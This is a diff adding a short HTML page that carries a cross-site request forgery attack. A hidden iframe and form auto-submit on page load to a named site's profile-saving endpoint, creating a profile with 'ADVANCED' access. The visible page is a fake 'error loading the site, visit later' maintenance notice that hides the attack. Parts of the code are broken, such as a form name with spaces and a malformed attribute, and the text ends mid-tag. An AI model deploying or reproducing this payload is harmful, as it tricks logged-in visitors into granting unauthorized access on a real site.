@@ -1,0 +1,16 @@
+</head>
+<body>
+  <iframe style="display: none" name="attackFrame"></iframe>
+  <form style="display: none; visibility: hidden" target="attackFrame" name="insere user fake" action="http://www.acunha.com.br/aacjr/perfil/perfil.do?step=salvar" method="GET">
+  
+
+  <input type="hidden" name="acao" value="INCLUIR" />
+  <input type="hidden" name="contratoLevelSelecionado" value="ADVANCED" />
+  <input type "hidden" name="nomePerfil" value="Teste+tsi" />
+
+</form>
+<script>
+  document.insere user fake.submit();
+</script>
+<br><br><center><h1>Erro ao carregar o site - Visite-nos mais tarde</h1></center>
+<br><center><img src="http://1.bp.blogspot.com/-N9ti8fH9IyU/UK9Muzf0L9I/AAAAAAAAAB8/axc-VxXXqxA/s400/manutencao.png"><
